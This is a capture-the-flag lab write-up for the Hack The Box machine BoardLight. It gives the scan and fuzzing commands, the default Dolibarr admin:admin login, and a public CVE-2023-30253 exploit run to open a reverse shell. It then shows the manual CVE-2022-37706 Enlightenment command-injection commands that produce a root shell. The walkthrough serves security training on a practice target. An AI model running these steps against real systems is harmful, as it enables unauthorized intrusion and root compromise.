---
icon: ubuntu
---

# BoardLight - Easy

<figure><img src="../../.gitbook/assets/image (1807).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/boardlight"><strong>BoardLight</strong></a></p></figcaption></figure>

## Gaining Access

Nmap Scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.11 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-16 08:19 EDT
Nmap scan report for board.htb (10.10.11.11)
Host is up (0.061s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   74.41 ms 10.10.16.1
2   43.52 ms board.htb (10.10.11.11)
```

### Port 80 HTTP

<figure><img src="../../.gitbook/assets/image (1808).png" alt=""><figcaption></figcaption></figure>

**let's add this to our /etc/hosts file**

```
10.10.11.11 	board.htb
```

### Subdomain Enumeration

Let's check for some possible subdomains, I am going to filter on word count

```
wfuzz -c -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://board.htb' -H 'HOST: FUZZ.board.htb' --hw 1053
```

<figure><img src="../../.gitbook/assets/image (1809).png" alt=""><figcaption></figcaption></figure>

Let's add the new found sudomain to our /etc/host file and see what we find

```
10.10.11.11 	board.htb crm.board.htb
```

<figure><img src="../../.gitbook/assets/image (1810).png" alt=""><figcaption></figcaption></figure>

default admin credentials work

```
admin:admin
```

<figure><img src="../../.gitbook/assets/image (1811).png" alt=""><figcaption></figcaption></figure>

### **Dolibarr RCE Exploit**

Searching for known exploits on Dolibarr v 17.0.0, we come across the following reverse shell POC on GitHub. Let's clone it, and try it

```
git clone https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253.git
```

Make sure you setup a nc listener on your attack machine. I setup a listener on port 443, then run the following command:

```
python3 exploit.py http://crm.board.htb admin admin 10.10.16.3 443
```

<figure><img src="../../.gitbook/assets/image (1812).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1813).png" alt=""><figcaption></figcaption></figure>

## Privelege Escalation

We got a shell as www-data, let's see what other users are on this box

```
grep 'sh$' /etc/passwd
```

<figure><img src="../../.gitbook/assets/image (1814).png" alt=""><figcaption></figcaption></figure>

First thing I like to do before running linpeas, is to check the config files for some credentials

<figure><img src="../../.gitbook/assets/image (1815).png" alt=""><figcaption></figcaption></figure>

And we find some for the sql database hosted on port 3306

<figure><img src="../../.gitbook/assets/image (1816).png" alt=""><figcaption></figcaption></figure>

Before we dive into that rabbit hole I am going to test for credential reuse.

### **Credential Reuse**

<figure><img src="../../.gitbook/assets/image (1817).png" alt=""><figcaption></figcaption></figure>

And it worked we managed to escalate our privelleges to larissa

### Linpeas

<figure><img src="../../.gitbook/assets/image (1818).png" alt=""><figcaption></figcaption></figure>

Linpeas found some interesting SUID binaries

After some research we came acros a nice CVE-2022-37706

### Enlightment CVE-2022-37706

There is a nice POC shell script in the [repo](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit), but it’s not hard to do manually.

I’ll need two directories to make this work. First, `/tmp/net`, and another that matches my injection. The second one must exist when I pass in something like `/dev/../tmp/;/tmp/0xdf` as an argument. That means I need `/tmp/;/tmp/deimos` as a directory. That includes a directory named `;`

```
mkdir /tmp/net
mkdir -p "/tmp/;/tmp/deimos"
find '/tmp/;' -ls
```

<figure><img src="../../.gitbook/assets/image (1819).png" alt=""><figcaption></figcaption></figure>

Now, when the command injection works, it’s going to call `/tmp/deimos`. So I’ll put a script there that just runs `bash` and make it executable:

```
echo "/bin/bash" > /tmp/deimos
chmod +x /tmp/deimos
```

<figure><img src="../../.gitbook/assets/image (1820).png" alt=""><figcaption></figcaption></figure>

Now I run `enlightenment_sys` to trigger. It will check that `/dev/../tmp/;/tmp/`deimos exists as a directory, and then call `system`, resulting in calling `bash`, which returns to a root shell:

```
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/deimos" /tmp///net
```

<figure><img src="../../.gitbook/assets/image (1821).png" alt=""><figcaption></figcaption></figure>

